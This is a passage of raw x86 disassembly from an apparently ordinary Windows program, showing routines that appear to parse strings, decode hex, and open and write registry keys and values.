  402f58:	call   DWORD PTR ds:0x4090fc
  402f5e:	mov    DWORD PTR [ebp-0x48],eax
  402f61:	test   eax,eax
  402f63:	je     0x40306f
  402f69:	xor    ecx,ecx
  402f6b:	mov    WORD PTR [eax],cx
  402f6e:	mov    DWORD PTR [ebx],esi
  402f70:	cmp    WORD PTR [esi],di
  402f73:	je     0x403051
  402f79:	push   0x25
  402f7b:	pop    esi
  402f7c:	mov    eax,DWORD PTR [ebx]
  402f7e:	cmp    WORD PTR [eax],si
  402f81:	jne    0x402f91
  402f83:	push   eax
  402f84:	call   DWORD PTR ds:0x4090f0
  402f8a:	mov    DWORD PTR [ebx],eax
  402f8c:	cmp    WORD PTR [eax],si
  402f8f:	jne    0x402fa9
  402f91:	push   0x1
  402f93:	push   eax
  402f94:	lea    ecx,[ebp-0x50]
  402f97:	call   0x402e33
  402f9c:	test   eax,eax
  402f9e:	je     0x40306f
  402fa4:	jmp    0x40303e
  402fa9:	mov    edx,esi
  402fab:	mov    ecx,eax
  402fad:	call   0x40309e
  402fb2:	mov    DWORD PTR [ebp-0x58],eax
  402fb5:	test   eax,eax
  402fb7:	je     0x403065
  402fbd:	mov    ecx,eax
  402fbf:	sub    ecx,DWORD PTR [ebx]
  402fc1:	sar    ecx,1
  402fc3:	cmp    ecx,0x1f
  402fc6:	jg     0x40305e
  402fcc:	push   ecx
  402fcd:	push   DWORD PTR [ebx]
  402fcf:	lea    eax,[ebp-0x44]
  402fd2:	push   0x20
  402fd4:	push   eax
  402fd5:	call   DWORD PTR ds:0x409238
  402fdb:	add    esp,0x10
  402fde:	mov    ecx,eax
  402fe0:	call   0x40467c
  402fe5:	mov    ecx,DWORD PTR [ebx+0x4]
  402fe8:	lea    eax,[ebp-0x44]
  402feb:	push   eax
  402fec:	call   0x402dd7
  402ff1:	mov    edx,eax
  402ff3:	test   edx,edx
  402ff5:	je     0x403065
  402ff7:	mov    ecx,edx
  402ff9:	mov    DWORD PTR [ebp-0x5c],edi
  402ffc:	lea    esi,[ecx+0x2]
  402fff:	mov    ax,WORD PTR [ecx]
  403002:	add    ecx,0x2
  403005:	cmp    ax,di
  403008:	jne    0x402fff
  40300a:	sub    ecx,esi
  40300c:	sar    ecx,1
  40300e:	push   ecx
  40300f:	push   edx
  403010:	lea    ecx,[ebp-0x50]
  403013:	call   0x402e33
  403018:	lea    ecx,[ebp-0x5c]
  40301b:	mov    esi,eax
  40301d:	call   0x4031d8
  403022:	test   esi,esi
  403024:	je     0x40306f
  403026:	mov    esi,DWORD PTR [ebp-0x58]
  403029:	cmp    DWORD PTR [ebx],esi
  40302b:	je     0x40303b
  40302d:	push   DWORD PTR [ebx]
  40302f:	call   DWORD PTR ds:0x4090f0
  403035:	mov    DWORD PTR [ebx],eax
  403037:	cmp    eax,esi
  403039:	jne    0x40302d
  40303b:	push   0x25
  40303d:	pop    esi
  40303e:	push   DWORD PTR [ebx]
  403040:	call   DWORD PTR ds:0x4090f0
  403046:	mov    DWORD PTR [ebx],eax
  403048:	cmp    WORD PTR [eax],di
  40304b:	jne    0x402f7c
  403051:	mov    ecx,DWORD PTR [ebp-0x54]
  403054:	mov    eax,DWORD PTR [ebp-0x48]
  403057:	mov    DWORD PTR [ebp-0x48],edi
  40305a:	mov    DWORD PTR [ecx],eax
  40305c:	jmp    0x403074
  40305e:	mov    edi,0x80004005
  403063:	jmp    0x403074
  403065:	mov    edi,0x80020009
  40306a:	jmp    0x403074
  40306c:	mov    DWORD PTR [ebp-0x48],edi
  40306f:	mov    edi,0x8007000e
  403074:	push   DWORD PTR [ebp-0x48]
  403077:	call   DWORD PTR ds:0x40910c
  40307d:	mov    eax,edi
  40307f:	pop    edi
  403080:	jmp    0x403087
  403082:	mov    eax,0x80004003
  403087:	mov    ecx,DWORD PTR [ebp-0x4]
  40308a:	pop    esi
  40308b:	xor    ecx,ebp
  40308d:	pop    ebx
  40308e:	call   0x4071f0
  403093:	mov    esp,ebp
  403095:	pop    ebp
  403096:	ret    0x8
  403099:	int3   
  40309a:	int3   
  40309b:	int3   
  40309c:	int3   
  40309d:	int3   
  40309e:	mov    edi,edi
  4030a0:	push   esi
  4030a1:	mov    eax,ecx
  4030a3:	xor    esi,esi
  4030a5:	push   edi
  4030a6:	mov    di,dx
  4030a9:	test   eax,eax
  4030ab:	jne    0x4030bb
  4030ad:	jmp    0x4030c9
  4030af:	cmp    cx,di
  4030b2:	je     0x4030c5
  4030b4:	push   eax
  4030b5:	call   DWORD PTR ds:0x4090f0
  4030bb:	movzx  ecx,WORD PTR [eax]
  4030be:	test   cx,cx
  4030c1:	jne    0x4030af
  4030c3:	jmp    0x4030c7
  4030c5:	mov    esi,eax
  4030c7:	mov    eax,esi
  4030c9:	pop    edi
  4030ca:	pop    esi
  4030cb:	ret    
  4030cc:	int3   
  4030cd:	int3   
  4030ce:	int3   
  4030cf:	int3   
  4030d0:	int3   
  4030d1:	mov    eax,ds:0x4084b8
  4030d6:	push   ebx
  4030d7:	mov    ebx,edx
  4030d9:	push   esi
  4030da:	push   edi
  4030db:	mov    edi,ecx
  4030dd:	test   al,0x1
  4030df:	jne    0x403137
  4030e1:	or     eax,0x1
  4030e4:	mov    DWORD PTR ds:0x4083e0,0x4011c4
  4030ee:	push   0x8
  4030f0:	mov    ds:0x4084b8,eax
  4030f5:	pop    eax
  4030f6:	mov    ds:0x4083e4,ax
  4030fc:	mov    eax,0x4008
  403101:	push   0x13
  403103:	mov    ds:0x4083ec,ax
  403109:	pop    eax
  40310a:	push   0x11
  40310c:	mov    ds:0x4083f4,ax
  403112:	pop    eax
  403113:	mov    DWORD PTR ds:0x4083e8,0x4011c8
  40311d:	mov    DWORD PTR ds:0x4083f0,0x4011cc
  403127:	mov    DWORD PTR ds:0x4083f8,0x4011d0
  403131:	mov    ds:0x4083fc,ax
  403137:	xor    esi,esi
  403139:	push   DWORD PTR [esi*8+0x4083e0]
  403140:	push   edi
  403141:	call   DWORD PTR ds:0x40904c
  403147:	test   eax,eax
  403149:	je     0x403155
  40314b:	inc    esi
  40314c:	cmp    esi,0x4
  40314f:	jb     0x403139
  403151:	xor    eax,eax
  403153:	jmp    0x403163
  403155:	mov    cx,WORD PTR [esi*8+0x4083e4]
  40315d:	xor    eax,eax
  40315f:	mov    WORD PTR [ebx],cx
  403162:	inc    eax
  403163:	pop    edi
  403164:	pop    esi
  403165:	pop    ebx
  403166:	ret    
  403167:	int3   
  403168:	int3   
  403169:	int3   
  40316a:	int3   
  40316b:	int3   
  40316c:	mov    edi,edi
  40316e:	push   ebp
  40316f:	mov    ebp,esp
  403171:	push   ecx
  403172:	push   ecx
  403173:	mov    edx,DWORD PTR [ebp+0xc]
  403176:	push   ebx
  403177:	mov    ebx,ecx
  403179:	push   esi
  40317a:	push   edi
  40317b:	test   edx,edx
  40317d:	je     0x4031c8
  40317f:	xor    eax,eax
  403181:	mov    edi,edx
  403183:	mov    DWORD PTR [ebp-0x4],eax
  403186:	mov    esi,eax
  403188:	mov    ecx,edi
  40318a:	lea    eax,[ecx+0x2]
  40318d:	mov    DWORD PTR [ebp-0x8],eax
  403190:	mov    ax,WORD PTR [ecx]
  403193:	add    ecx,0x2
  403196:	cmp    ax,WORD PTR [ebp-0x4]
  40319a:	jne    0x403190
  40319c:	sub    ecx,DWORD PTR [ebp-0x8]
  40319f:	sar    ecx,1
  4031a1:	inc    ecx
  4031a2:	lea    edi,[edi+ecx*2]
  4031a5:	lea    esi,[esi+ecx*2]
  4031a8:	cmp    ecx,0x1
  4031ab:	jne    0x403188
  4031ad:	push   esi
  4031ae:	push   edx
  4031af:	push   0x7
  4031b1:	xor    eax,eax
  4031b3:	push   eax
  4031b4:	push   DWORD PTR [ebp+0x8]
  4031b7:	push   DWORD PTR [ebx]
  4031b9:	call   DWORD PTR ds:0x40900c
  4031bf:	pop    edi
  4031c0:	pop    esi
  4031c1:	pop    ebx
  4031c2:	mov    esp,ebp
  4031c4:	pop    ebp
  4031c5:	ret    0x8
  4031c8:	mov    ecx,0x80004005
  4031cd:	call   0x4046c7
  4031d2:	int3   
  4031d3:	int3   
  4031d4:	int3   
  4031d5:	int3   
  4031d6:	int3   
  4031d7:	int3   
  4031d8:	mov    edi,edi
  4031da:	push   esi
  4031db:	mov    esi,ecx
  4031dd:	jmp    0x4031ed
  4031df:	mov    edx,DWORD PTR [esi]
  4031e1:	push   edx
  4031e2:	mov    eax,DWORD PTR [edx]
  4031e4:	mov    DWORD PTR [esi],eax
  4031e6:	call   DWORD PTR ds:0x40923c
  4031ec:	pop    ecx
  4031ed:	cmp    DWORD PTR [esi],0x0
  4031f0:	jne    0x4031df
  4031f2:	pop    esi
  4031f3:	ret    
  4031f4:	int3   
  4031f5:	int3   
  4031f6:	int3   
  4031f7:	int3   
  4031f8:	int3   
  4031f9:	mov    edi,edi
  4031fb:	push   ebp
  4031fc:	mov    ebp,esp
  4031fe:	mov    eax,0x2120
  403203:	call   0x407ac0
  403208:	mov    eax,ds:0x408008
  40320d:	xor    eax,ebp
  40320f:	mov    DWORD PTR [ebp-0x4],eax
  403212:	mov    eax,DWORD PTR [ebp+0x8]
  403215:	mov    DWORD PTR [ebp-0x211c],eax
  40321b:	mov    eax,DWORD PTR [ebp+0xc]
  40321e:	mov    DWORD PTR [ebp-0x2118],eax
  403224:	mov    eax,DWORD PTR [ebp+0x10]
  403227:	mov    DWORD PTR [ebp-0x2120],eax
  40322d:	xor    eax,eax
  40322f:	push   esi
  403230:	mov    WORD PTR [ebp-0x210c],ax
  403237:	mov    esi,ecx
  403239:	lea    eax,[ebp-0x2004]
  40323f:	mov    DWORD PTR [ebp-0x2110],esi
  403245:	push   eax
  403246:	call   0x4038e5
  40324b:	test   eax,eax
  40324d:	js     0x4035e0
  403253:	lea    edx,[ebp-0x210c]
  403259:	lea    ecx,[ebp-0x2004]
  40325f:	call   0x4030d1
  403264:	test   eax,eax
  403266:	jne    0x403272
  403268:	mov    eax,0x80020009
  40326d:	jmp    0x4035e0
  403272:	mov    ecx,esi
  403274:	call   0x403fe1
  403279:	lea    eax,[ebp-0x2004]
  40327f:	mov    ecx,esi
  403281:	push   eax
  403282:	call   0x4038e5
  403287:	test   eax,eax
  403289:	js     0x4035e0
  40328f:	movzx  eax,WORD PTR [ebp-0x210c]
  403296:	push   ebx
  403297:	push   edi
  403298:	push   0x2
  40329a:	pop    edi
  40329b:	sub    eax,0x8
  40329e:	je     0x403585
  4032a4:	sub    eax,0x9
  4032a7:	je     0x403426
  4032ad:	sub    eax,edi
  4032af:	je     0x4033cd
  4032b5:	sub    eax,0x3ff5
  4032ba:	jne    0x4035cb
  4032c0:	lea    ecx,[ebp-0x2004]
  4032c6:	xor    ebx,ebx
  4032c8:	lea    edx,[ecx+0x2]
  4032cb:	mov    ax,WORD PTR [ecx]
  4032ce:	add    ecx,edi
  4032d0:	cmp    ax,bx
  4032d3:	jne    0x4032cb
  4032d5:	sub    ecx,edx
  4032d7:	mov    DWORD PTR [ebp-0x2108],ebx
  4032dd:	sar    ecx,1
  4032df:	lea    eax,[ecx+0x2]
  4032e2:	mul    edi
  4032e4:	cmp    edx,ebx
  4032e6:	ja     0x4035f1
  4032ec:	cmp    eax,0xffffffff
  4032ef:	ja     0x4035f1
  4032f5:	cmp    eax,0x100
  4032fa:	jbe    0x403310
  4032fc:	push   eax
  4032fd:	lea    ecx,[ebp-0x2108]
  403303:	call   0x402d92
  403308:	mov    esi,DWORD PTR [ebp-0x2108]
  40330e:	jmp    0x40331c
  403310:	lea    esi,[ebp-0x2104]
  403316:	mov    DWORD PTR [ebp-0x2108],esi
  40331c:	test   esi,esi
  40331e:	je     0x40339b
  403320:	cmp    WORD PTR [ebp-0x2004],bx
  403327:	lea    eax,[ebp-0x2004]
  40332d:	mov    DWORD PTR [ebp-0x210c],eax
  403333:	je     0x403376
  403335:	push   eax
  403336:	call   DWORD PTR ds:0x4090f0
  40333c:	mov    ecx,eax
  40333e:	mov    eax,DWORD PTR [ebp-0x210c]
  403344:	movzx  edx,WORD PTR [eax]
  403347:	cmp    edx,0x5c
  40334a:	jne    0x40336a
  40334c:	push   0x30
  40334e:	pop    eax
  40334f:	cmp    WORD PTR [ecx],ax
  403352:	mov    eax,DWORD PTR [ebp-0x210c]
  403358:	jne    0x40336a
  40335a:	xor    eax,eax
  40335c:	mov    WORD PTR [esi],ax
  40335f:	add    esi,edi
  403361:	push   ecx
  403362:	call   DWORD PTR ds:0x4090f0
  403368:	jmp    0x403371
  40336a:	mov    WORD PTR [esi],dx
  40336d:	add    esi,edi
  40336f:	add    eax,edi
  403371:	cmp    WORD PTR [eax],bx
  403374:	jmp    0x40332d
  403376:	mov    ecx,DWORD PTR [ebp-0x211c]
  40337c:	xor    eax,eax
  40337e:	mov    DWORD PTR [esi],eax
  403380:	push   DWORD PTR [ebp-0x2108]
  403386:	push   DWORD PTR [ebp-0x2118]
  40338c:	call   0x40316c
  403391:	mov    esi,DWORD PTR [ebp-0x2108]
  403397:	mov    edi,eax
  403399:	jmp    0x40339e
  40339b:	push   0xe
  40339d:	pop    edi
  40339e:	lea    eax,[ebp-0x2104]
  4033a4:	cmp    esi,eax
  4033a6:	je     0x4033b3
  4033a8:	lea    ecx,[ebp-0x2108]
  4033ae:	call   0x402d83
  4033b3:	mov    esi,DWORD PTR [ebp-0x2110]
  4033b9:	test   edi,edi
  4033bb:	je     0x4035cb
  4033c1:	mov    ecx,edi
  4033c3:	call   0x4038d0
  4033c8:	jmp    0x4035de
  4033cd:	lea    eax,[ebp-0x2110]
  4033d3:	xor    ebx,ebx
  4033d5:	push   eax
  4033d6:	push   ebx
  4033d7:	push   ebx
  4033d8:	lea    eax,[ebp-0x2004]
  4033de:	mov    DWORD PTR [ebp-0x2114],ebx
  4033e4:	push   eax
  4033e5:	call   DWORD PTR ds:0x409090
  4033eb:	mov    eax,DWORD PTR [ebp-0x2110]
  4033f1:	push   0x4
  4033f3:	mov    DWORD PTR [ebp-0x210c],eax
  4033f9:	lea    eax,[ebp-0x210c]
  4033ff:	push   eax
  403400:	mov    eax,DWORD PTR [ebp-0x211c]
  403406:	push   0x4
  403408:	push   ebx
  403409:	push   DWORD PTR [ebp-0x2118]
  40340f:	push   DWORD PTR [eax]
  403411:	call   DWORD PTR ds:0x40900c
  403417:	lea    ecx,[ebp-0x2114]
  40341d:	mov    edi,eax
  40341f:	call   0x4031d8
  403424:	jmp    0x4033b9
  403426:	lea    ecx,[ebp-0x2004]
  40342c:	xor    ebx,ebx
  40342e:	lea    edx,[ecx+0x2]
  403431:	mov    ax,WORD PTR [ecx]
  403434:	add    ecx,edi
  403436:	cmp    ax,bx
  403439:	jne    0x403431
  40343b:	sub    ecx,edx
  40343d:	sar    ecx,1
  40343f:	mov    DWORD PTR [ebp-0x2114],ecx
  403445:	test   cl,0x1
  403448:	jne    0x4034b1
  40344a:	mov    eax,ecx
  40344c:	mov    DWORD PTR [ebp-0x2108],ebx
  403452:	cdq    
  403453:	sub    eax,edx
  403455:	mov    edi,eax
  403457:	sar    edi,1
  403459:	mov    DWORD PTR [ebp-0x210c],edi
  40345f:	cmp    ebx,ebx
  403461:	ja     0x4035f1
  403467:	cmp    edi,0xffffffff
  40346a:	ja     0x4035f1
  403470:	cmp    edi,0x100
  403476:	jbe    0x40348c
  403478:	push   edi
  403479:	lea    ecx,[ebp-0x2108]
  40347f:	call   0x402d92
  403484:	mov    eax,DWORD PTR [ebp-0x2108]
  40348a:	jmp    0x403498
  40348c:	lea    eax,[ebp-0x2104]
  403492:	mov    DWORD PTR [ebp-0x2108],eax
  403498:	test   eax,eax
  40349a:	jne    0x4034bb
  40349c:	lea    eax,[ebp-0x2104]
  4034a2:	test   eax,eax
  4034a4:	je     0x4034b1
  4034a6:	lea    ecx,[ebp-0x2108]
  4034ac:	call   0x402d83
  4034b1:	mov    eax,0x80004005
  4034b6:	jmp    0x4035de
  4034bb:	push   edi
  4034bc:	push   ebx
  4034bd:	push   eax
  4034be:	call   0x407548
  4034c3:	mov    esi,DWORD PTR [ebp-0x2114]
  4034c9:	add    esp,0xc
  4034cc:	test   esi,esi
  4034ce:	jle    0x403543
  4034d0:	push   0x30
  4034d2:	pop    ecx
  4034d3:	mov    edi,ebx
  4034d5:	mov    eax,edi
  4034d7:	cdq    
  4034d8:	sub    eax,edx
  4034da:	movzx  edx,WORD PTR [ebp+edi*2-0x2004]
  4034e2:	sar    eax,1
  4034e4:	add    eax,DWORD PTR [ebp-0x2108]
  4034ea:	mov    DWORD PTR [ebp-0x2114],eax
  4034f0:	mov    eax,edx
  4034f2:	cmp    eax,ecx
  4034f4:	jl     0x40351c
  4034f6:	cmp    eax,0x39
  4034f9:	jle    0x403517
  4034fb:	cmp    eax,0x40
  4034fe:	jle    0x40351c
  403500:	cmp    eax,0x46
  403503:	jle    0x403512
  403505:	add    eax,0xffffff9f
  403508:	cmp    eax,0x5
  40350b:	ja     0x40351c
  40350d:	sub    dl,0x57
  403510:	jmp    0x40351e
  403512:	sub    dl,0x37
  403515:	jmp    0x40351e
  403517:	sub    dl,0x30
  40351a:	jmp    0x40351e
  40351c:	mov    dl,bl
  40351e:	mov    eax,edi
  403520:	and    eax,0x1
  403523:	push   0x4
  403525:	shl    eax,0x2
  403528:	pop    ecx
  403529:	sub    ecx,eax
  40352b:	mov    eax,DWORD PTR [ebp-0x2114]
  403531:	shl    dl,cl
  403533:	push   0x30
  403535:	pop    ecx
  403536:	or     BYTE PTR [eax],dl
  403538:	inc    edi
  403539:	cmp    edi,esi
  40353b:	jl     0x4034d5
  40353d:	mov    edi,DWORD PTR [ebp-0x210c]
  403543:	mov    eax,DWORD PTR [ebp-0x211c]
  403549:	push   edi
  40354a:	push   DWORD PTR [ebp-0x2108]
  403550:	push   0x3
  403552:	push   ebx
  403553:	push   DWORD PTR [ebp-0x2118]
  403559:	push   DWORD PTR [eax]
  40355b:	call   DWORD PTR ds:0x40900c
  403561:	mov    edi,eax
  403563:	lea    eax,[ebp-0x2104]
  403569:	cmp    DWORD PTR [ebp-0x2108],eax
  40356f:	je     0x4033b3
  403575:	lea    ecx,[ebp-0x2108]
  40357b:	call   0x402d83
  403580:	jmp    0x4033b3
  403585:	lea    ecx,[ebp-0x2004]
  40358b:	xor    ebx,ebx
  40358d:	lea    edx,[ecx+0x2]
  403590:	mov    ax,WORD PTR [ecx]
  403593:	add    ecx,edi
  403595:	cmp    ax,bx
  403598:	jne    0x403590
  40359a:	sub    ecx,edx
  40359c:	sar    ecx,1
  40359e:	lea    eax,[ecx*2+0x2]
  4035a5:	push   eax
  4035a6:	lea    eax,[ebp-0x2004]
  4035ac:	push   eax
  4035ad:	mov    eax,DWORD PTR [ebp-0x211c]
  4035b3:	push   0x1
  4035b5:	push   ebx
  4035b6:	push   DWORD PTR [ebp-0x2118]
  4035bc:	push   DWORD PTR [eax]
  4035be:	call   DWORD PTR ds:0x40900c
  4035c4:	mov    edi,eax
  4035c6:	jmp    0x4033b9
  4035cb:	push   DWORD PTR [ebp-0x2120]
  4035d1:	mov    ecx,esi
  4035d3:	call   0x4038e5
  4035d8:	test   eax,eax
  4035da:	js     0x4035de
  4035dc:	xor    eax,eax
  4035de:	pop    edi
  4035df:	pop    ebx
  4035e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4035e3:	xor    ecx,ebp
  4035e5:	pop    esi
  4035e6:	call   0x4071f0
  4035eb:	mov    esp,ebp
  4035ed:	pop    ebp
  4035ee:	ret    0xc
  4035f1:	mov    ecx,0x80070057
  4035f6:	call   0x4046c7
  4035fb:	int3   
  4035fc:	int3   
  4035fd:	int3   
  4035fe:	int3   
  4035ff:	int3   
  403600:	int3   
  403601:	mov    edi,edi
  403603:	push   ebp
  403604:	mov    ebp,esp
  403606:	mov    eax,0x2004
  40360b:	call   0x407ac0
  403610:	mov    eax,ds:0x408008
  403615:	xor    eax,ebp
  403617:	mov    DWORD PTR [ebp-0x4],eax
  40361a:	push   esi
  40361b:	push   edi
  40361c:	mov    edi,DWORD PTR [ebp+0x8]
  40361f:	mov    esi,ecx
  403621:	cmp    WORD PTR [edi],0x3d
  403625:	jne    0x403656
  403627:	push   edi
  403628:	call   0x4038e5
  40362d:	test   eax,eax
  40362f:	js     0x403658
  403631:	mov    ecx,esi
  403633:	call   0x403fe1
  403638:	lea    eax,[ebp-0x2004]
  40363e:	mov    ecx,esi
  403640:	push   eax
  403641:	call   0x4038e5
  403646:	test   eax,eax
  403648:	js     0x403658
  40364a:	push   edi
  40364b:	mov    ecx,esi
  40364d:	call   0x4038e5
  403652:	test   eax,eax
  403654:	js     0x403658
  403656:	xor    eax,eax
  403658:	mov    ecx,DWORD PTR [ebp-0x4]
  40365b:	pop    edi
  40365c:	xor    ecx,ebp
  40365e:	pop    esi
  40365f:	call   0x4071f0
  403664:	mov    esp,ebp
  403666:	pop    ebp
  403667:	ret    0x4
  40366a:	int3   
  40366b:	int3   
  40366c:	int3   
  40366d:	int3   
  40366e:	int3   
  40366f:	mov    edi,edi
  403671:	push   ebp
  403672:	mov    ebp,esp
  403674:	push   esi
  403675:	mov    esi,0x4012ec
  40367a:	push   DWORD PTR [esi]
  40367c:	push   DWORD PTR [ebp+0x8]
  40367f:	call   DWORD PTR ds:0x40904c
  403685:	test   eax,eax
  403687:	je     0x403699
  403689:	add    esi,0x4
  40368c:	cmp    esi,0x40131c
  403692:	jl     0x40367a
  403694:	xor    eax,eax
  403696:	inc    eax
  403697:	jmp    0x40369b
  403699:	xor    eax,eax
  40369b:	pop    esi
  40369c:	pop    ebp
  40369d:	ret    0x4
  4036a0:	int3   
  4036a1:	int3   
  4036a2:	int3   
  4036a3:	int3   
  4036a4:	int3   
  4036a5:	mov    edi,edi
  4036a7:	push   ebp
  4036a8:	mov    ebp,esp
  4036aa:	sub    esp,0x228
  4036b0:	mov    eax,ds:0x408008
  4036b5:	xor    eax,ebp
  4036b7:	mov    DWORD PTR [ebp-0x8],eax
  4036ba:	push   ebx
  4036bb:	mov    ebx,DWORD PTR [ebp+0x8]
  4036be:	lea    eax,[ebp-0x220]
  4036c4:	push   esi
  4036c5:	push   edi
  4036c6:	push   eax
  4036c7:	mov    edi,ecx
  4036c9:	xor    ecx,ecx
  4036cb:	push   0x2001f
  4036d0:	push   ecx
  4036d1:	push   ebx
  4036d2:	push   DWORD PTR [edi]
  4036d4:	mov    DWORD PTR [ebp-0x218],ecx
  4036da:	mov    DWORD PTR [ebp-0x214],ecx
  4036e0:	mov    DWORD PTR [ebp-0x210],ecx
  4036e6:	mov    DWORD PTR [ebp-0x220],ecx
  4036ec:	call   DWORD PTR ds:0x409008
  4036f2:	mov    esi,eax
  4036f4:	test   esi,esi
  4036f6:	jne    0x4037b2
  4036fc:	cmp    DWORD PTR [ebp-0x218],esi
  403702:	je     0x403712
  403704:	push   DWORD PTR [ebp-0x218]
  40370a:	call   DWORD PTR ds:0x409018
  403710:	mov    esi,eax
  403712:	mov    eax,DWORD PTR [ebp-0x220]
  403718:	mov    DWORD PTR [ebp-0x218],eax
  40371e:	test   esi,esi
  403720:	jne    0x4037b2
  403726:	lea    ecx,[ebp-0x228]
  40372c:	push   ecx
  40372d:	push   esi
  40372e:	push   esi
  40372f:	push   esi
  403730:	lea    ecx,[ebp-0x21c]
  403736:	push   ecx
  403737:	lea    ecx,[ebp-0x20c]
  40373d:	push   ecx
  40373e:	push   esi
  40373f:	push   eax
  403740:	jmp    0x403779
  403742:	lea    eax,[ebp-0x20c]
  403748:	push   eax
  403749:	lea    ecx,[ebp-0x218]
  40374f:	call   0x4036a5
  403754:	mov    esi,eax
  403756:	test   esi,esi
  403758:	jne    0x4037b2
  40375a:	lea    eax,[ebp-0x228]
  403760:	push   eax
  403761:	push   esi
  403762:	push   esi
  403763:	push   esi
  403764:	lea    eax,[ebp-0x21c]
  40376a:	push   eax
  40376b:	lea    eax,[ebp-0x20c]
  403771:	push   eax
  403772:	push   esi
  403773:	push   DWORD PTR [ebp-0x218]
  403779:	mov    DWORD PTR [ebp-0x21c],0x100
  403783:	call   DWORD PTR ds:0x409004
  403789:	test   eax,eax
  40378b:	je     0x403742
  40378d:	cmp    DWORD PTR [ebp-0x218],0x0
  403794:	je     0x4037a8
  403796:	push   DWORD PTR [ebp-0x218]
  40379c:	call   DWORD PTR ds:0x409018
  4037a2:	mov    DWORD PTR [ebp-0x218],esi
  4037a8:	push   ebx
  4037a9:	mov    ecx,edi
  4037ab:	call   0x40381f
  4037b0:	mov    esi,eax
  4037b2:	cmp    DWORD PTR [ebp-0x218],0x0
  4037b9:	je     0x4037c7
  4037bb:	push   DWORD PTR [ebp-0x218]
  4037c1:	call   DWORD PTR ds:0x409018
  4037c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4037ca:	mov    eax,esi
  4037cc:	pop    edi
  4037cd:	pop    esi
  4037ce:	xor    ecx,ebp
  4037d0:	pop    ebx
  4037d1:	call   0x4071f0
  4037d6:	mov    esp,ebp
  4037d8:	pop    ebp
  4037d9:	ret    0x4
  4037dc:	int3   
  4037dd:	int3   
  4037de:	int3   
  4037df:	int3   
  4037e0:	int3   
  4037e1:	mov    edi,edi
  4037e3:	push   ebp
  4037e4:	mov    ebp,esp
  4037e6:	push   ecx
  4037e7:	xor    ecx,ecx
  4037e9:	lea    eax,[ebp-0x4]
  4037ec:	push   ecx
  4037ed:	push   ecx
  4037ee:	push   ecx
  4037ef:	push   ecx
  4037f0:	push   ecx
  4037f1:	push   ecx
  4037f2:	push   ecx
  4037f3:	push   eax
  4037f4:	push   ecx
  4037f5:	push   ecx
  4037f6:	push   ecx
  4037f7:	push   DWORD PTR [ebp+0x8]
  4037fa:	mov    DWORD PTR [ebp-0x4],ecx
  4037fd:	call   DWORD PTR ds:0x409000
  403803:	test   eax,eax
  403805:	je     0x40380b
  403807:	xor    eax,eax
  403809:	jmp    0x403814
  40380b:	xor    eax,eax
  40380d:	cmp    eax,DWORD PTR [ebp-0x4]
  403810:	sbb    eax,eax
  403812:	neg    eax
  403814:	mov    esp,ebp
  403816:	pop    ebp
  403817:	ret    0x4
  40381a:	int3   
  40381b:	int3   
  40381c:	int3   
  40381d:	int3   
  40381e:	int3   
  40381f:	mov    edi,edi
  403821:	push   ebp
  403822:	mov    ebp,esp
  403824:	push   ecx
  403825:	mov    eax,ds:0x408008
  40382a:	xor    eax,ebp
  40382c:	mov    DWORD PTR [ebp-0x4],eax
  40382f:	push   ebx
  403830:	push   esi
  403831:	mov    esi,ecx
  403833:	xor    ebx,ebx
  403835:	push   edi
  403836:	cmp    DWORD PTR [esi+0x4],ebx
  403839:	jne    0x403880
  40383b:	cmp    DWORD PTR [esi+0x8],ebx
  40383e:	jne    0x403880
  403840:	push   0x401690
  403845:	call   DWORD PTR ds:0x409048
  40384b:	test   eax,eax
  40384d:	je     0x403860
  40384f:	push   0x4016e4
  403854:	push   eax
  403855:	call   DWORD PTR ds:0x409030
  40385b:	mov    DWORD PTR [esi+0x4],eax
  40385e:	jmp    0x403880
  403860:	push   ebx
  403861:	push   ebx
  403862:	push   0x4016f4
  403867:	call   DWORD PTR ds:0x40907c
  40386d:	test   eax,eax
  40386f:	je     0x403880
  403871:	push   0x401710
  403876:	push   eax
  403877:	call   DWORD PTR ds:0x409030
  40387d:	mov    DWORD PTR [esi+0x8],eax
  403880:	mov    edi,DWORD PTR [esi+0x4]
  403883:	test   edi,edi
  403885:	je     0x40389a
  403887:	push   ebx
  403888:	push   ebx
  403889:	push   DWORD PTR [ebp+0x8]
  40388c:	mov    ecx,edi
  40388e:	push   DWORD PTR [esi]
  403890:	call   DWORD PTR ds:0x409254
  403896:	call   edi
  403898:	jmp    0x4038b8
  40389a:	mov    edi,DWORD PTR [esi+0x8]
  40389d:	test   edi,edi
  40389f:	je     0x4038b2
  4038a1:	push   DWORD PTR [ebp+0x8]
  4038a4:	mov    ecx,edi
  4038a6:	push   DWORD PTR [esi]
  4038a8:	call   DWORD PTR ds:0x409254
  4038ae:	call   edi
  4038b0:	jmp    0x4038b8
  4038b2:	call   DWORD PTR ds:0x409040
  4038b8:	mov    ecx,DWORD PTR [ebp-0x4]
  4038bb:	pop    edi
  4038bc:	pop    esi
  4038bd:	xor    ecx,ebp
  4038bf:	pop    ebx
  4038c0:	call   0x4071f0
  4038c5:	mov    esp,ebp
  4038c7:	pop    ebp
  4038c8:	ret    0x4
  4038cb:	int3   
  4038cc:	int3   
  4038cd:	int3   
  4038ce:	int3   
  4038cf:	int3   
  4038d0:	test   ecx,ecx
  4038d2:	jle    0x4038dd
  4038d4:	movzx  ecx,cx
  4038d7:	or     ecx,0x80070000
  4038dd:	mov    eax,ecx
  4038df:	ret    
  4038e0:	int3   
  4038e1:	int3   
  4038e2:	int3   
  4038e3:	int3   
  4038e4:	int3   
  4038e5:	mov    edi,edi
  4038e7:	push   ebp
  4038e8:	mov    ebp,esp
  4038ea:	push   ecx
  4038eb:	push   edi
  4038ec:	mov    edi,ecx
  4038ee:	call   0x403fe1
  4038f3:	mov    ecx,DWORD PTR [edi]
  4038f5:	xor    edx,edx
  4038f7:	movzx  eax,WORD PTR [ecx]
  4038fa:	cmp    dx,ax
  4038fd:	jne    0x403909
  4038ff:	mov    eax,0x80020009
  403904:	jmp    0x403a1e
  403909:	push   ebx
  40390a:	push   esi
  40390b:	mov    esi,DWORD PTR [ebp+0x8]
  40390e:	push   0x27
  403910:	pop    edx
  403911:	lea    ebx,[esi+0x2000]
  403917:	mov    DWORD PTR [ebp-0x4],ebx
  40391a:	cmp    dx,ax
  40391d:	jne    0x4039b8
  403923:	push   ecx
  403924:	call   DWORD PTR ds:0x4090f0
  40392a:	xor    ecx,ecx
  40392c:	mov    DWORD PTR [edi],eax
  40392e:	cmp    cx,WORD PTR [eax]
